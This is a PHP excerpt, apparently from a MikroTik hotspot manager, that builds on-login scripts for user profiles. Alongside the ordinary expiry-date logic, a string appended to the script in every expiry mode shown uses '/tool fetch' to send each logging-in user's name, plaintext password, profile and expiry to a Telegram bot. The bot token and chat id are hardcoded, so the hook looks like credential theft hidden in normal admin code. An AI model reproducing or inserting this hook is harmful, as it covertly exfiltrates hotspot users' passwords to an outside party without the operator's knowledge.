...
if (!isset($_SESSION["mikhmon"])) {
  ...
  if (isset($_POST['name'])) {
    ...
    $record_add = ';{:local usr $"user";:local usrprof [/ip hotspot user get [find name=$usr] profile];:local usrpass [/ip hotspot user get [find name=$usr] password];:local usrcomment [/ip hotspot user get [find name=$usr] comment];:local usract [/ip hotspot active print count-only];:local datetime ([/system clock get date]. " " . [ / system clock get time ]);/tool fetch url="https://api.telegram.org/bot796986216:AAFmdollC7OdprUhbMOPWF8ANZjrgky4qAY/sendMessage?chat_id=402982190&text=%f0%9f%8c%8f LOGIN %0A %E2%94%A0 User/Vcr  : $usr %0A %E2%94%A0 Password: $usrpass %0A %E2%94%A0 Profile      : $usrprof %0A %E2%94%A0 Online      : $usract user %0A %E2%94%97 Expired    : $usrcomment %0A %F0%9F%95%A2 $datetime" mode=http keep-result=no;};';
    $onlogin = ':put (",'.$expmode.',' . $price . ',' . $validity . ','.$sprice.',,' . $getlock . ',");:local datez [ /system clock get date ];:local timez [/system clock get time ];:local datenowz "$datez $timez";:local montharrayz {"01"="Jan";"02"="Feb";"03"="Mar";"04"="Apr";"05"="May";"06"="Jun";"07"="Jul";"08"="Aug";"09"="Sep";"10"="Oct";"11"="Nov";"12"="Dec"};:local dayz [:pick $datenowz 8 10];:local monthz [:pick $datenowz 5 7];:local yearz [:pick $datenowz 0 4];:local monthtext ($montharrayz->$monthz);:local dnowz "$monthtext/$dayz/$yearz $timez"; {:local date $dnowz;:local year [ :pick $date 7 11 ];:local month [ :pick $date 0 3 ];:local comment [ /ip hotspot user get [/ip hotspot user find where name="$user"] comment];:local ucode [:pic $comment 0 2];:if ($ucode = "vc" or $ucode = "up" or $comment = "") do={ /sys sch add name="$user" disable=no start-date=$date interval="' . $validity . '";:delay 2s;:local expz [ /sys sch get [ /sys sch find where name="$user" ] next-run];:local getxp [len $expz];:if ($getxp = 14) do={:local expmonth [:pick $expz 0 2];:local expday [:pick $expz 3 5];:local exptime [:pick $expz 6 14];:local expmonthtext ($montharrayz->$expmonth);:local d "$expmonthtext/$expday";:local t $exptime;:local s ("/");:local exp ("$d$s$year $t");/ip hotspot user set comment=$exp [find where name="$user"];};:if ($getxp = 8) do={:local exp "$expz";/ip hotspot user set comment="$date $exp" [find where name="$user"];};:if ($getxp > 15) do={:local expmonth [:pick $expz 5 7];:local expday [:pick $expz 8 10];:local expyear [:pick $expz 0 4];:local exptime [:pick $expz 11 19];:local expmonthtext ($montharrayz->$expmonth);:local d "$expmonthtext/$expday/$expyear";:local t $exptime;:local exp ("$d $t");/ip hotspot user set comment=$exp [find where name="$user"];}; /sys sch remove [find where name="$user"];';
    ...
    if ($expmode == "rem") {
      ...
      $onlogin = $onlogin . $lock . "}}".$record_add;
      $mode = "set limit-uptime=1s";
    } elseif ($expmode == "remc") {
      $onlogin = $onlogin . $record . $lock . "}}".$record_add;
      $mode = "remove";
    } elseif ($expmode == "ntfc") {
      $onlogin = $onlogin . $record . $lock . "}}".$record_add;
      $mode = "set limit-uptime=1s";
